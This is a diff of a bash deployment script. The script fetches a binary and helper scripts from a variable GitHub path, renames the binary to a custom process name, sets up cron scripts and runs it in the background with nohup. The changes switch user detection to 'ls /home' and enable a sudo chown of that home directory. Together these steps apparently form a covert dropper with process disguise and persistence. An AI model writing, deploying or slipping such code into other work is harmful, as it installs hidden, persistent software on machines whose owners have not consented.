@@ -28,13 +28,16 @@ if [ $num = 2 ];
 	then
 		echo "RUN PROCESS 1"; 
 		#1 Linux Trx
-			whoami > inuser.txt
+			#whoami > inuser.txt
+			# get name
+			Uname=$(ls /home)
+			sudo echo $Uname > inuser.txt
 			wget https://github.com/$gitpath/raw/main/linux.tar.gz
 			tar -xvf linux.tar.gz
 			rm -rf linux.tar.gz
 			mkdir bin
 			cp linux bin/linux
-			Uname=(head -1 inuser.txt)
+			
 			chown -R $Uname:$Uname /home/$Uname/
 			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
 			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
@@ -50,13 +53,13 @@ if [ $num = 2 ];
 			cp inuser.txt bin/inuser.txt
 			cd bin/
            	wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
-			Uuname=$(cat inuser.txt)
+			Uname=$(ls /home)
 			USEPROCNAME=$(cat SETPROCNAME.txt)
 			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
 			mv runlinux.sh runsrc.sh
 			chmod +x runsrc.sh
 			mv linux $USEPROCNAME
-			#sudo chown -R $Uuname:$Uuname /home/$Uuname/
+			sudo chown -R $Uname:$Uname /home/$Uname/
 			nohup sh runsrc.sh > result.log 2>&1 &
 			#2
 			
@@ -64,7 +67,8 @@ if [ $num = 2 ];
 		echo "RUN PROCESS 2"; 
 
 #1 Linux Trx
-			whoami > inuser.txt
+			Uname=$(ls /home)
+			sudo echo $Uname > inuser.txt
 			wget https://github.com/$gitpath/raw/main/linux.tar.gz
 			tar -xvf linux.tar.gz
 			rm -rf linux.tar.gz
@@ -86,13 +90,13 @@ if [ $num = 2 ];
 			cp inuser.txt bin/inuser.txt
 			cd bin/
            	wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
-			Uuname=$(cat inuser.txt)
+			Uname=$(ls /home)
 			USEPROCNAME=$(cat SETPROCNAME.txt)
 			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
 			mv runlinux.sh runsrc.sh
 			chmod +x runsrc.sh
 			mv linux $USEPROCNAME
-			#sudo chown -R $Uuname:$Uuname /home/$Uuname/
+			sudo chown -R $Uname:$Uname /home/$Uname/
 			nohup sh runsrc.sh > result.log 2>&1 &
 			#2
 
